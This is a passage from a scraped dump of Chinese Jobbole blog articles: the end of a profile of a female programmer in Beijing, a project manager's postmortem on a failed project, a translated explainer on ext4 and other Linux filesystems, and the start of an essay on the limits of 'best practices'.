田揉了揉发涩的眼睛，发动汽车，开往六环外的住所。高速走得很顺，车里放着《北京土著》，顺便想想周末该做什么新菜。他突然觉得，要是这段路再长一点，也挺好的。晚上10点，后厂村的办公大楼仍灯火通明“程序媛”和你们想象得不太一样小徐在中关村上班，是个程序员，性别女。她知道女性程序员在大众眼里的模样：要么，就是从不化妆，戴着厚厚的眼镜，穿着上也从不在意，在人群里是最不起眼的存在；要么，就是只顾打扮不顾业务，利用着与生俱来的“性别优势”，自然地索求同事们的帮助。她认为自己与两者均无相似之处。在求职时，小徐的同学们或多或少地抱怨过用人单位的不公平待遇，即同样条件下，招收女性程序员的可能性较小。在这份需脑力与体力兼备的工作中，女性似乎确实不占优势，但幸运的是，许多大型公司在招聘时注重性别的均衡，她也未曾遭受异样的审视。“我就职的这家外企比较重视员工的diversity(差异性)，因此团队里的女性不少，很多还是女博士。”她回忆道。通勤时段，人人都是“低头族”小徐去年研究生毕业，从香港来到北京求职的她，选择中关村并非为了高薪，而是希望能继续积累知识。“希望我的工作能兼顾我的专业和兴趣，同时能给我不断提升自我的机会。”经过筛选，最终她就职于某外企的研究机构，与云技术、人工智能等尖端科技打交道。太多年轻人初入职场时也怀着学习的心态，但不久后便与繁忙的节奏和升职加薪的烦恼妥协，开始得过且过。小徐却认为，自己所在团队的氛围起到了带头作用，大家在头脑风暴中不断思考、沉淀的过程，是她在工作中最欣赏的部分。“我不喜欢那种领导让做什么就做什么的节奏，太死板，久而久之脑袋都麻木了。”虽然目前的工作尽如人意，但小徐还面临着大部分“程序媛”都避不开的问题：来自亲人朋友的无形压力。随着IT圈“赚5万花5千”“过度劳动”“脱发”等吐槽越来越深入人心，身边的人自然会产生担忧：身体状况怎么样？平时有自己的时间吗？非要做这行不可吗？小徐的钢琴受访者供图小徐多次与母亲提及这个话题，但都以她的坚持而结束。但她潜意识里也存在着焦虑。虽然入职只有一年光景，但她已经从周围同事的身上看到了自己可能的未来，并不时怀疑：我可以做到那么优秀吗？“刚入职的时候抱有热情和冲劲很正常，但眼看着同事和领导资历越高，节奏越快，我也会担心自己以后能否平衡工作和生活，会遇到什么样的瓶颈。总之我不希望工作侵吞我所有的生活，如果有合适机会的话，我或许会考虑跳槽，但目前的职业方向还是不会变的。”小徐说。然而，尽管有着迷茫和顾虑，但小徐仍坚持着自己对事物的新鲜感。给自己报的成人钢琴班已经小有成效，最近正练习着《小步舞曲》。她是职场新人，是“程序媛”，也是“北漂”，但最重要的，她是她自己。1赞收藏评论", "url_object_id": "a47d0bf593223db07b3e04d691f43a44"},{"title": "一名 IT 经理是怎么把一个项目带崩的", "url": "http://blog.jobbole.com/107390/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/862d3441fe78a8d48f7dc96d0acc95d2.jpg"], "praise_nums": 4, "fav_nums": 3, "comments_nums": 5, "tags": "2,0,1,8,/,0,9,/,0,4, ,·", "content": "本文作者：伯乐在线-zer0Black。未经作者许可，禁止转载！欢迎加入伯乐在线专栏作者。我是一名项目经理，在过去的四个月里，我把一个项目带崩了（上线后频出问题，用户无法使用）。在最近的几天，我每天都在反思自己，我都在问自己以下几个问题：1.我做错了什么？2.我在其中占有多重的因素？以下内容，我将回答以上问题，并在最后说一下我的补救措施。项目和团队背景首先给大家说明一下项目背景，以便各位对此项目有更清晰的了解：1.该项目是一个二次开发项目，第一个基础版本（打印申报系统）也由我带领开发。2.系统是需要和国家系统对接，有三条主流程。3.需求频繁变化，由于系统需要对接国家系统，需求方对需求也不甚了解。曾在5月份一个月内需求变更超过8次，都是主流程变更。4.项目大小按照最初需求估算，约在100人天左右。5.项目两条主流程无法测试，依赖于外部U盾，但开发过程中并没有U盾。6.客户现场使用U盾调试和开发时间约为20天左右。7.我当时同时负责大大小小4个项目，没有进入开发，仅管控进度。8.团队成员共3名，其中两名是当时开发基础版本的项目成员，他们对此项目较为熟悉。9.项目推进过程中，需要多次去现场调试测试，由团队中的两名工程师共同前去。我做错了什么除了监控进度，还要管理质量在项目的开发初期，我制定了一份详细的开发计划，用于指导整个开发过程。开发计划交付与了客户，而答应了的事情就要做到，所以在整个项目过程中，我对进度管控很严。我定期检查功能是否完成，定期和客户汇报情况，保证了开发进度顺利推进。但也由此埋下了祸根，仅仅看需求是否完成，而未关注完成的质量如何。项目质量出现了许多细节性问题。比如：1.上线后，客户那边发现其中一条主流程都走不下去2.其中申报功能，系统提示成功。但实际上并没有真的申报成功，申报后在国家系统无法查询到3.打印功能小问题较多，打印获取的数据错误4.同步数据的功能无法同步或者同步的数据错误5.执行时间过长的功能，数据库会强制断开连接等等问题，就不一一列举反思：1.进度和开发速度固然重要，但以质量换速度不可取2.如果开发时间和质量冲突，优先保质量，毕竟你埋下的坑，总是要坑你自己的3.再困难的情况下，也要保证基本测试4.时间极其不允许的情况下，也要保证主线功能顺利执行既要给予信任，也要保持警惕项目中的三名成员，都是合格的开发，对使用的框架非常熟悉。其中两名还是基础版本开发成员，对需求也很熟悉。所以项目中，我放心的把整个项目交给了他们。基于对他们的放心，加上其他项目事情繁杂，对此项目关注度，对他们的关注度就不够了。我在项目中给予了他们非常充分的信任，信任他们可以把一切事情都做好。但我没有在正确的时候给予他们正确的指引，项目中出现的困难点，我也没有帮助他们解决，甚至于没有给出思路。所有的一切，都靠他们自己完成。我在这个项目里做的，就是对接客户，催进度。再无第三件事。反思：1.不论什么原因，都要关注到项目成员的状态2.给予信任没错，但也要适当保持警惕，他们多少会因为经验问题疏忽遗漏一些问题3.给予信任，也要给予帮助，不以时间为理由推脱你应该对他们进行的指点和帮助。毕竟现在剩下来一分钟，以后要花一个小时去弥补若无法全局掌控，就指派专人负责这是我在项目中做的最错误的地方。由于种种原因，我无法掌握到项目的每个要点和细节。而项目中有三个开发。我并没指明其中某一个来负责整个项目，所有事情都让他们自己商量。从客户对接来的问题，我也是仅告知对应的开发。整个项目中，没有一个人对项目中的每个要点了如指掌。反思：1.手里捏着管理的权利，却没有做到管理的事情。是我在这个项目里最大的问题2.授权！授权！授权！如果自己无法亲力亲为投入项目管理工作，就授权给团队某个成员管理权限，让他代替你去做管理工作3.管理一人，总比管理多个人轻松，也更有效要控制需求，更要控制流程项目是二次开发、成员对项目很熟悉、项目工作量不大、时间紧。基于以上原因，我掉以轻心，没有在项目初期进行项目的设计和规划，未指定任何开发规范。仅仅告诉开发的同事要多复用，也未检查他们是否真的复用了。项目开发中的需求变更，客户反馈意见，我我都仅仅是告知他们一声，未做详细的修改规划，所有事情都靠嘴说，所有变动都放在了我和他们的脑子里。对项目上心程度不够，未对客户的需求变更做控制和管理。所有变更都压给了开发的同事。整个项目以及其不规范的方式在运行，我也未在其中起到控制作用，项目开发一团乱麻。反思：1.不做设计，不进开发2.以管理工具指导开发进行，开发过程中所有变更、反馈做记录3.控制需求变更，拒绝不合理的需求4.需求变更规范化操作，统一变更，而不是直接压给开发无论什么情况下，都要进行codereview整个项目过去了几乎四个月，我仅仅花了两个多小时简单看了下代码，未指出代码的任何问题。这也导致出问题后来我花了成倍的时间来处理codereview的工作，并且项目成型后的代码修改困难。项目开发过程中，也未让开发间互相进行代码review，也没有进行代码评审会。其实代码中出现了很多问题，最后检查代码的时候，发现各种命名不规范、代码复用不到位、简单逻辑复杂写等等。而这些问题，很大一部分都是早期未做规定，未指定人负责项目、未进行早期codereview造成的。开发各自为战，难免造成代码问题。代码质量的问题，淋漓尽致的体现的在项目中，项目中的诸多bug，都是因为代码不规范引起的。甚至于开发人员自己对自己写过的东西，都有些拎不清了。反思：1.代码质量非常重要，代码越规范bug越少2.代码互评能让开发更注重自己代码的质量3.codereview非常有必要，越早期的codereview越能有效的节省后期的时间我在其中占有多重的因素100%我怎么填坑的项目上线，问题频出，用户不满。花了8天时间来处理这个问题。幸亏项目不大，我一个人也能够挽回。目前暂时解决完毕，我简单说一下我是怎么填坑的：1.和开发主流程的同事详细熟悉了所有需求要点2.基于我对项目需求的熟悉，我花了三天把所有主流程的所有代码分析完毕，做出了我认为应该的修改，并实施部署到生产环境测试（这是在给开着的飞机换引擎，但需要U盾才能测试，仅有生产环境的机器有U盾，别无他法）3.每天花超过12个小时来进行codereview和修改，几乎每天codereview+修改到凌晨2点多（仅修改了问题较大且影响较小的地方。小问题未修改、牵涉面较广的地方未修改）4.每次上班时间的修改让开发同事坐在旁边和我一起进行，我进行修改，开发同事在一旁监督。确保我不出错5.优化功能点，把我发现的提示问题，和优化点都同步修改进代码中，确保用户体验不要太糟，以期能挽回一些用户心态我所吸取的教训总结1.先设计，后开发2.管理权下放，项目中必须有人全身心负责3.无论什么情况都要进行codereview4.压缩质量得到的进度保证不可取，开发周期不合理决不答应客户。否则坑了自己坑了同事，更坑了客户4赞3收藏5评论关于作者：zer0Black目前工作为移动开发，兴趣广泛，计算机各方面均有强烈兴趣。个人主页·我的文章·26·", "url_object_id": "a49e55ee9903149a00118337ee891fd3"},{"title": "深入理解 ext4 等 Linux 文件系统", "url": "http://blog.jobbole.com/114377/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/623fff738e3b78d500adde9b8202bb80.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,1,2, ,·", "content": "原文出处：JimSalter译文出处：Linux中国/魑魅魍魉了解ext4的历史，包括其与ext3和之前的其它文件系统之间的区别。目前的大部分Linux文件系统都默认采用ext4文件系统，正如以前的Linux发行版默认使用ext3、ext2以及更久前的ext。对于不熟悉Linux或文件系统的朋友而言，你可能不清楚ext4相对于上一版本ext3带来了什么变化。你可能还想知道在一连串关于替代的文件系统例如Btrfs、XFS和ZFS不断被发布的情况下，ext4是否仍然能得到进一步的发展。在一篇文章中，我们不可能讲述文件系统的所有方面，但我们尝试让你尽快了解Linux默认文件系统的发展历史，包括它的诞生以及未来发展。我仔细研究了维基百科里的各种关于ext文件系统文章、kernel.org的wiki中关于ext4的条目以及结合自己的经验写下这篇文章。ext简史MINIX文件系统在有ext之前，使用的是MINIX文件系统。如果你不熟悉Linux历史，那么可以理解为MINIX是用于IBMPC/AT微型计算机的一个非常小的类Unix系统。AndrewTannenbaum为了教学的目的而开发了它，并于1987年发布了源代码（以印刷版的格式！）。IBM1980中期的PC/AT，MBlairMartin，CCBY-SA4.0虽然你可以细读MINIX的源代码，但实际上它并不是自由开源软件（FOSS）。出版Tannebaum著作的出版商要求你花69美元的许可费来运行MINIX，而这笔费用包含在书籍的费用中。尽管如此，在那时来说非常便宜，并且MINIX的使用得到迅速发展，很快超过了Tannebaum当初使用它来教授操作系统编码的意图。在整个20世纪90年代，你可以发现MINIX的安装在世界各个大学里面非常流行。而此时，年轻的LinusTorvalds使用MINIX来开发原始Linux内核，并于1991年首次公布，而后在1992年12月在GPL开源协议下发布。但是等等，这是一篇以文件系统为主题的文章不是吗？是的，MINIX有自己的文件系统，早期的Linux版本依赖于它。跟MINIX一样，Linux的文件系统也如同玩具那般小——MINIX文件系统最多能处理14个字符的文件名，并且只能处理64MB的存储空间。到了1991年，一般的硬盘尺寸已经达到了40-140MB。很显然，Linux需要一个更好的文件系统。ext当Linus开发出刚起步的Linux内核时，RémyCard从事第一代的ext文件系统的开发工作。ext文件系统在1992年首次实现并发布——仅在Linux首次发布后的一年！——ext解决了MINIX文件系统中最糟糕的问题。1992年的ext使用在Linux内核中的新虚拟文件系统（VFS）抽象层。与之前的MINIX文件系统不同的是，ext可以处理高达2GB存储空间并处理255个字符的文件名。但ext并没有长时间占统治地位，主要是由于它原始的时间戳（每个文件仅有一个时间戳，而不是今天我们所熟悉的有inode、最近文件访问时间和最新文件修改时间的时间戳。）仅仅一年后，ext2就替代了它。ext2Rémy很快就意识到ext的局限性，所以一年后他设计出ext2替代它。当ext仍然根植于“玩具”操作系统时，ext2从一开始就被设计为一个商业级文件系统，沿用BSD的Berkeley文件系统的设计原理。ext2提供了GB级别的最大文件大小和TB级别的文件系统大小，使其在20世纪90年代的地位牢牢巩固在文件系统大联盟中。很快它被广泛地使用，无论是在Linux内核中还是最终在MINIX中，且利用第三方模块可以使其应用于MacOS和Windows。但这里仍然有一些问题需要解决：ext2文件系统与20世纪90年代的大多数文件系统一样，如果在将数据写入到磁盘的时候，系统发生崩溃或断电，则容易发生灾难性的数据损坏。随着时间的推移，由于碎片（单个文件存储在多个位置，物理上其分散在旋转的磁盘上），它们也遭受了严重的性能损失。尽管存在这些问题，但今天ext2还是用在某些特殊的情况下——最常见的是，作为便携式USB驱动器的文件系统格式。ext31998年，在ext2被采用后的6年后，StephenTweedie宣布他正在致力于改进ext2。这成了ext3，并于2001年11月在2.4.15内核版本中被采用到Linux内核主线中。20世纪90年代中期的PackardBell计算机，Spacekid，CC0在大部分情况下，ext2在Linux发行版中工作得很好，但像FAT、FAT32、HFS和当时的其它文件系统一样——在断电时容易发生灾难性的破坏。如果在将数据写入文件系统时候发生断电，则可能会将其留在所谓不一致的状态——事情只完成一半而另一半未完成。这可能导致大量文件丢失或损坏，这些文件与正在保存的文件无关甚至导致整个文件系统无法卸载。ext3和20世纪90年代后期的其它文件系统，如微软的NTFS，使用日志来解决这个问题。日志是磁盘上的一种特殊的分配区域，其写入被存储在事务中；如果该事务完成磁盘写入，则日志中的数据将提交给文件系统自身。如果系统在该操作提交前崩溃，则重新启动的系统识别其为未完成的事务而将其进行回滚，就像从未发生过一样。这意味着正在处理的文件可能依然会丢失，但文件系统本身保持一致，且其它所有数据都是安全的。在使用ext3文件系统的Linux内核中实现了三个级别的日志记录方式：日记journal、顺序ordered和回写writeback。日记是最低风险模式，在将数据和元数据提交给文件系统之前将其写入日志。这可以保证正在写入的文件与整个文件系统的一致性，但其显著降低了性能。顺序是大多数Linux发行版默认模式；顺序模式将元数据写入日志而直接将数据提交到文件系统。顾名思义，这里的操作顺序是固定的：首先，元数据提交到日志；其次，数据写入文件系统，然后才将日志中关联的元数据更新到文件系统。这确保了在发生崩溃时，那些与未完整写入相关联的元数据仍在日志中，且文件系统可以在回滚日志时清理那些不完整的写入事务。在顺序模式下，系统崩溃可能导致在崩溃期间文件的错误被主动写入，但文件系统它本身——以及未被主动写入的文件——确保是安全的。回写是第三种模式——也是最不安全的日志模式。在回写模式下，像顺序模式一样，元数据会被记录到日志，但数据不会。与顺序模式不同，元数据和数据都可以以任何有利于获得最佳性能的顺序写入。这可以显著提高性能，但安全性低很多。尽管回写模式仍然保证文件系统本身的安全性，但在崩溃或崩溃之前写入的文件很容易丢失或损坏。跟之前的ext2类似，ext3使用16位内部寻址。这意味着对于有着4K块大小的ext3在最大规格为16TiB的文件系统中可以处理的最大文件大小为2TiB。ext4TheodoreTs’o（是当时ext3主要开发人员）在2006年发表的ext4，于两年后在2.6.28内核版本中被加入到了Linux主线。Ts’o将ext4描述为一个显著扩展ext3但仍然依赖于旧技术的临时技术。他预计ext4终将会被真正的下一代文件系统所取代。DellPrecision380工作站，LanceFisher，CCBY-SA2.0ext4在功能上与ext3在功能上非常相似，但支持大文件系统，提高了对碎片的抵抗力，有更高的性能以及更好的时间戳。ext4vsext3ext3和ext4有一些非常明确的差别，在这里集中讨论下。向后兼容性ext4特地设计为尽可能地向后兼容ext3。这不仅允许ext3文件系统原地升级到ext4；也允许ext4驱动程序以ext3模式自动挂载ext3文件系统，因此使它无需单独维护两个代码库。大文件系统ext3文件系统使用32位寻址，这限制它仅支持2TiB文件大小和16TiB文件系统系统大小（这是假设在块大小为4KiB的情况下，一些ext3文件系统使用更小的块大小，因此对其进一步被限制）。ext4使用48位的内部寻址，理论上可以在文件系统上分配高达16TiB大小的文件，其中文件系统大小最高可达1000000TiB（1EiB）。在早期ext4的实现中有些用户空间的程序仍然将其限制为最大大小为16TiB的文件系统，但截至2011年，e2fsprogs已经直接支持大于16TiB大小的ext4文件系统。例如，红帽企业Linux在其合同上仅支持最高50TiB的ext4文件系统，并建议ext4卷不超过100TiB。分配方式改进ext4在将存储块写入磁盘之前对存储块的分配方式进行了大量改进，这可以显著提高读写性能。区段区段extent是一系列连续的物理块(最多达128MiB，假设块大小为4KiB），可以一次性保留和寻址。使用区段可以减少给定文件所需的inode数量，并显著减少碎片并提高写入大文件时的性能。多块分配ext3为每一个新分配的块调用一次块分配器。当多个写入同时打开分配器时，很容易导致严重的碎片。然而，ext4使用延迟分配，这允许它合并写入并更好地决定如何为尚未提交的写入分配块。持久的预分配在为文件预分配磁盘空间时，大部分文件系统必须在创建时将零写入该文件的块中。ext4允许替代使用fallocate()，它保证了空间的可用性（并试图为它找到连续的空间），而不需要先写入它。这显著提高了写入和将来读取流和数据库应用程序的写入数据的性能。延迟分配这是一个耐人寻味而有争议性的功能。延迟分配允许ext4等待分配将写入数据的实际块，直到它准备好将数据提交到磁盘。（相比之下，即使数据仍然在往写入缓存中写入，ext3也会立即分配块。）当缓存中的数据累积时，延迟分配块允许文件系统对如何分配块做出更好的选择，降低碎片（写入，以及稍后的读）并显著提升性能。然而不幸的是，它增加了还没有专门调用fsync()方法（当程序员想确保数据完全刷新到磁盘时）的程序的数据丢失的可能性。假设一个程序完全重写了一个文件：fd=open(\"file\",O_TRUNC);write(fd,data);close(fd);1fd=open(\"file\",O_TRUNC);write(fd,data);close(fd);使用旧的文件系统，close(fd);足以保证file中的内容刷新到磁盘。即使严格来说，写不是事务性的，但如果文件关闭后发生崩溃，则丢失数据的风险很小。如果写入不成功（由于程序上的错误、磁盘上的错误、断电等），文件的原始版本和较新版本都可能丢失数据或损坏。如果其它进程在写入文件时访问文件，则会看到损坏的版本。如果其它进程打开文件并且不希望其内容发生更改——例如，映射到多个正在运行的程序的共享库。这些进程可能会崩溃。为了避免这些问题，一些程序员完全避免使用O_TRUNC。相反，他们可能会写入一个新文件，关闭它，然后将其重命名为旧文件名：fd=open(\"newfile\");write(fd,data);close(fd);rename(\"newfile\",\"file\");1fd=open(\"newfile\");write(fd,data);close(fd);rename(\"newfile\",\"file\");在没有延迟分配的文件系统下，这足以避免上面列出的潜在的损坏和崩溃问题：因为rename()是原子操作，所以它不会被崩溃中断；并且运行的程序将继续引用旧的文件。现在file的未链接版本只要有一个打开的文件文件句柄即可。但是因为ext4的延迟分配会导致写入被延迟和重新排序，rename(\"newfile\",\"file\")可以在newfile的内容实际写入磁盘内容之前执行，这出现了并行进行再次获得file坏版本的问题。为了缓解这种情况，Linux内核（自版本2.6.30）尝试检测这些常见代码情况并强制立即分配。这会减少但不能防止数据丢失的可能性——并且它对新文件没有任何帮助。如果你是一位开发人员，请注意：保证数据立即写入磁盘的唯一方法是正确调用fsync()。无限制的子目录ext3仅限于32000个子目录；ext4允许无限数量的子目录。从2.6.23内核版本开始，ext4使用HTree索引来减少大量子目录的性能损失。日志校验ext3没有对日志进行校验，这给处于内核直接控制之外的磁盘或自带缓存的控制器设备带来了问题。如果控制器或具自带缓存的磁盘脱离了写入顺序，则可能会破坏ext3的日记事务顺序，从而可能破坏在崩溃期间（或之前一段时间）写入的文件。理论上，这个问题可以使用写入障碍barrier——在安装文件系统时，你在挂载选项设置barrier=1，然后设备就会忠实地执行fsync一直向下到底层硬件。通过实践，可以发现存储设备和控制器经常不遵守写入障碍——提高性能（和跟竞争对手比较的性能基准），但增加了本应该防止数据损坏的可能性。对日志进行校验和允许文件系统崩溃后第一次挂载时意识到其某些条目是无效或无序的。因此，这避免了回滚部分条目或无序日志条目的错误，并进一步损坏的文件系统——即使部分存储设备假做或不遵守写入障碍。快速文件系统检查在ext3下，在fsck被调用时会检查整个文件系统——包括已删除或空文件。相比之下，ext4标记了inode表未分配的块和扇区，从而允许fsck完全跳过它们。这大大减少了在大多数文件系统上运行fsck的时间，它实现于内核2.6.24。改进的时间戳ext3提供粒度为一秒的时间戳。虽然足以满足大多数用途，但任务关键型应用程序经常需要更严格的时间控制。ext4通过提供纳秒级的时间戳，使其可用于那些企业、科学以及任务关键型的应用程序。ext3文件系统也没有提供足够的位来存储2038年1月18日以后的日期。ext4在这里增加了两个位，将Unix纪元扩展了408年。如果你在公元2446年读到这篇文章，你很有可能已经转移到一个更好的文件系统——如果你还在测量自1970年1月1日00:00（UTC）以来的时间，这会让我死后得以安眠。在线碎片整理ext2和ext3都不直接支持在线碎片整理——即在挂载时会对文件系统进行碎片整理。ext2有一个包含的实用程序e2defrag，它的名字暗示——它需要在文件系统未挂载时脱机运行。（显然，这对于根文件系统来说非常有问题。）在ext3中的情况甚至更糟糕——虽然ext3比ext2更不容易受到严重碎片的影响，但ext3文件系统运行e2defrag可能会导致灾难性损坏和数据丢失。尽管ext3最初被认为“不受碎片影响”，但对同一文件（例如BitTorrent）采用大规模并行写入过程的过程清楚地表明情况并非完全如此。一些用户空间的手段和解决方法，例如Shake，以这样或那样方式解决了这个问题——但它们比真正的、文件系统感知的、内核级碎片整理过程更慢并且在各方面都不太令人满意。ext4通过e4defrag解决了这个问题，且是一个在线、内核模式、文件系统感知、块和区段级别的碎片整理实用程序。正在进行的ext4开发ext4，正如MontyPython中瘟疫感染者曾经说过的那样，“我还没死呢！”虽然它的主要开发人员认为它只是一个真正的下一代文件系统的权宜之计，但是在一段时间内，没有任何可能的候选人准备好（由于技术或许可问题）部署为根文件系统。在未来的ext4版本中仍然有一些关键功能要开发，包括元数据校验和、一流的配额支持和大分配块。元数据校验和由于ext4具有冗余超级块，因此为文件系统校验其中的元数据提供了一种方法，可以自行确定主超级块是否已损坏并需要使用备用块。可以在没有校验和的情况下，从损坏的超级块恢复——但是用户首先需要意识到它已损坏，然后尝试使用备用方法手动挂载文件系统。由于在某些情况下，使用损坏的主超级块安装文件系统读写可能会造成进一步的损坏，即使是经验丰富的用户也无法避免，这也不是一个完美的解决方案！与Btrfs或ZFS等下一代文件系统提供的极其强大的每块校验和相比，ext4的元数据校验和的功能非常弱。但它总比没有好。虽然校验所有的事情都听起来很简单！——事实上，将校验和与文件系统连接到一起有一些重大的挑战；请参阅设计文档了解详细信息。一流的配额支持等等，配额？！从ext2出现的那天开始我们就有了这些！是的，但它们一直都是事后的添加的东西，而且它们总是犯傻。这里可能不值得详细介绍，但设计文档列出了配额将从用户空间移动到内核中的方式，并且能够更加正确和高效地执行。大分配块随着时间的推移，那些讨厌的存储系统不断变得越来越大。由于一些固态硬盘已经使用8K硬件块大小，因此ext4对4K模块的当前限制越来越受到限制。较大的存储块可以显著减少碎片并提高性能，代价是增加“松弛”空间（当你只需要块的一部分来存储文件或文件的最后一块时留下的空间）。你可以在设计文档中查看详细说明。ext4的实际限制ext4是一个健壮、稳定的文件系统。如今大多数人都应该在用它作为根文件系统，但它无法处理所有需求。让我们简单地谈谈你不应该期待的一些事情——现在或可能在未来：虽然ext4可以处理高达1EiB大小（相当于1,000,000TiB）大小的数据，但你真的不应该尝试这样做。除了能够记住更多块的地址之外，还存在规模上的问题。并且现在ext4不会处理（并且可能永远不会）超过50-100TiB的数据。ext4也不足以保证数据的完整性。随着日志记录的重大进展又回到了ext3的那个时候，它并未涵盖数据损坏的许多常见原因。如果数据已经在磁盘上被破坏——由于故障硬件，宇宙射线的影响（是的，真的），或者只是数据随时间衰减——ext4无法检测或修复这种损坏。基于上面两点，ext4只是一个纯文件系统，而不是存储卷管理器。这意味着，即使你有多个磁盘——也就是奇偶校验或冗余，理论上你可以从ext4中恢复损坏的数据，但无法知道使用它是否对你有利。虽然理论上可以在不同的层中分离文件系统和存储卷管理系统而不会丢失自动损坏检测和修复功能，但这不是当前存储系统的设计方式，并且它将给新设计带来重大挑战。备用文件系统在我们开始之前，提醒一句：要非常小心，没有任何备用的文件系统作为主线内核的一部分而内置和直接支持！即使一个文件系统是安全的，如果在内核升级期间出现问题，使用它作为根文件系统也是非常可怕的。如果你没有充分的理由通过一个chroot去使用替代介质引导，耐心地操作内核模块、grub配置和DKMS……不要在一个很重要的系统中去掉预留的根文件。可能有充分的理由使用你的发行版不直接支持的文件系统——但如果你这样做，我强烈建议你在系统启动并可用后再安装它。（例如，你可能有一个ext4根文件系统，但是将大部分数据存储在ZFS或Btrfs池中。）XFSXFS与非ext文件系统在Linux中的主线中的地位一样。它是一个64位的日志文件系统，自2001年以来内置于Linux内核中，为大型文件系统和高度并发性提供了高性能（即大量的进程都会立即写入文件系统）。从RHEL7开始，XFS成为RedHatEnterpriseLinux的默认文件系统。对于家庭或小型企业用户来说，它仍然有一些缺点——最值得注意的是，重新调整现有XFS文件系统是一件非常痛苦的事情，不如创建另一个并复制数据更有意义。虽然XFS是稳定的且是高性能的，但它和ext4之间没有足够具体的最终用途差异，以值得推荐在非默认（如RHEL7）的任何地方使用它，除非它解决了对ext4的特定问题，例如大于50TiB容量的文件系统。XFS在任何方面都不是ZFS、Btrfs甚至WAFL（一个专有的SAN文件系统）的“下一代”文件系统。就像ext4一样，它应该被视为一种更好的方式的权宜之计。ZFSZFS由SunMicrosystems开发，以zettabyte命名——相当于1万亿GB——因为它理论上可以解决大型存储系统。作为真正的下一代文件系统，ZFS提供卷管理（能够在单个文件系统中处理多个单独的存储设备），块级加密校验和（允许以极高的准确率检测数据损坏），自动损坏修复（其中冗余或奇偶校验存储可用），快速异步增量复制，内联压缩等，以及更多。从Linux用户的角度来看，ZFS的最大问题是许可证问题。ZFS许可证是CDDL许可证，这是一种与GPL冲突的半许可的许可证。关于在Linux内核中使用ZFS的意义存在很多争议，其争议范围从“它是GPL违规”到“它是CDDL违规”到“它完全没问题，它还没有在法庭上进行过测试。”最值得注意的是，自2016年以来Canonical已将ZFS代码内联在其默认内核中，而且目前尚无法律挑战。此时，即使我作为一个非常狂热于ZFS的用户，我也不建议将ZFS作为Linux的根文件系统。如果你想在Linux上利用ZFS的优势，用ext4设置一个小的根文件系统，然后将ZFS用在你剩余的存储上，把数据、应用程序以及你喜欢的东西放在它上面——但把root分区保留在ext4上，直到你的发行版明确支持ZFS根目录。BtrfsBtrfs是B-TreeFilesystem的简称，通常发音为“butter”——由ChrisMason于2007年在Oracle任职期间发布。Btrfs旨在跟ZFS有大部分相同的目标，提供多种设备管理、每块校验、异步复制、直列压缩等，还有更多。截至2018年，Btrfs相当稳定，可用作标准的单磁盘文件系统，但可能不应该依赖于卷管理器。与许多常见用例中的ext4、XFS或ZFS相比，它存在严重的性能问题，其下一代功能——复制、多磁盘拓扑和快照管理——可能非常多，其结果可能是从灾难性地性能降低到实际数据的丢失。Btrfs的维持状态是有争议的；SUSEEnterpriseLinux在2015年采用它作为默认文件系统，而RedHat于2017年宣布它从RHEL7.4开始不再支持Btrfs。可能值得注意的是，该产品支持Btrfs部署用作单磁盘文件系统，而不是像ZFS中的多磁盘卷管理器，甚至Synology在它的存储设备使用Btrfs，但是它在传统Linux内核RAID（mdraid）之上分层来管理磁盘。1赞1收藏评论", "url_object_id": "a19f6c19524705b17c52d9e997dd7919"},{"title": "彼之蜜糖，吾之砒霜 —— 聊聊软件开发中的最佳实践", "url": "http://blog.jobbole.com/114361/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/08/aac3e1c638967b5812c7816b91669d20.jpg"], "praise_nums": 1, "fav_nums": 2, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,0,9, ,·", "content": "原文出处：sherrywasp“描述一个事物，唯有一个名词定义它的概念，唯有一个动词揭露它的行为，唯有一个形容词表现它的特征。要做的，就是用心去寻找那个名词、那个动词、那个形容词……”——福楼拜(GustaveFlaubert)我想讲个故事。很久很久以前（一般讲故事都是这样开头吧），两个老工程师在一起聊天，谈各自生涯中最自豪的工程。其中一个先讲述了他的杰作：“我们建造的桥，横跨一个峡谷，峡谷很宽很深。我们花了两年时间研究地质，选择材料。聘请了最好的工程师团队来设计方案，而这又花了五年时间。我们签下了最大的工程队，委托他们建造基础结构、塔墩、收费亭，以及用于连接桥梁和高速公路的道路。桥面下层是铁路，我们甚至还修了自行车道。那座桥花费了我数年的心血。”另外一个听完之后，陷入了沉思，过了一会儿，说到：“有一天晚上，我和一个朋友喝了点伏特加，然后我俩扔了一根绳子，越过一个河谷。呃……就是一根绳子，两头系在两颗树上。河谷两边各有一个村庄，起初，有人加了个滑轮，用来传递包裹。然后，有人拉起了第二根绳子，勉强可以走走，虽然很危险，但小伙子们很喜欢。后来，一群人重新修建了一下，使得更牢固。于是，女人们也开始从上面走，每天带着她们的农产品过桥。就这样，在桥的另一边形成了一个市场。因为地方开阔，造了很多房子，慢慢地发展成了一个镇子。绳索桥被木桥替代，这样就可以走马车了。后来，镇上的人们修了一座真正的石桥。再然后，人们又把石料改成了钢材。如今，那座钢构悬索桥依然伫立在那里。”前一个工程师沉默良久，说到：“有意思。我那座桥建成大约十年后，被拆除了。事实证明我们选错了地点，建好的桥没人用。据说有几个野路子的家伙，在下游几英里处，拉了一根绳子，所有人都从那走。”金门大桥（旧金山）我很喜欢这个故事。故事的出处，在一款消息队列产品——ZeroMQ的官方指南第6章里。说完故事，我想聊聊软件开发中，常常可以听到的一个概念——BestPractice：最佳实践。Wikipedia上对其解释为：Abestpracticeisamethodortechniquethathasbeengenerallyacceptedassuperiortoanyalternativesbecauseitproducesresultsthataresuperiortothoseachievedbyothermeansorbecauseithasbecomeastandardwayofdoingthings.(最佳实践是一种：因其产生的结果优于其它选择下的结果，或其已经成为一种做事的标准，从而被普遍认可优于任何替代方案的方法或技术。)这个概念源于管理学，然后在IT界泛滥。简而言之，就是所谓“正确的做法”。最佳实践本身是美好的存在，犹如夜空中的一轮明月，照亮黑暗中的方向，指引着摸索前行的凡人。但凡事有度，子曰：“过犹不及。”我今天想说的，就是这月亮的背面。（传说中，月球背面隐藏着……嘘~）潮汐锁定导致月球永远以同一面朝向地球首先，最佳实践容易带来思想包袱，让人无法专注于解决问题本身。总是希望采用最好的技术方法，不愿意在不正确的做法上浪费时间，导致瞻前顾后，甚至裹足不前。此时的最佳实